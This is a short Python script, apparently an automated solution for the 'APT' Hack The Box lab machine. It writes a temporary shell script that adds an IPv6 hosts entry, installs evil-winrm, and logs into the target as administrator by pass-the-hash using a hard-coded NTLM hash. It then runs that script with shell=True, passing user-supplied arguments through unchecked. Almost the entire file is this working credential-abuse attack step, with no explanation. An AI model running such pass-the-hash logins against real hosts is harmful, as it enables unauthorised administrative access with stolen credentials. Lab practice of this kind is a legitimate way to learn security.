import os
import sys
import subprocess
import string
import random

print ("### APT auto Administrator by ninhpn - This box need root to write IPv6 hosts file")
def check_privileges():

    if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
        raise PermissionError("You need to run this script with sudo or as root.")

bashfile=''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
bashfile='/tmp/'+bashfile+'.sh'

f = open(bashfile, 'w')
s = """sudo -- sh -c -e "echo 'dead:beef::b885:d62a:d679:573f addr apt.htb apt.htb.local htb.local' >> /etc/hosts";
sudo apt-get install evil-winrm
evil-winrm -i apt.htb -u administrator -H c370bddf384a691d811ff3495e8a72e2
"""
f.write(s)
f.close()
os.chmod(bashfile, 0o755)
bashcmd=bashfile
for arg in sys.argv[1:]:
  bashcmd += ' '+arg
subprocess.call(bashcmd, shell=True)
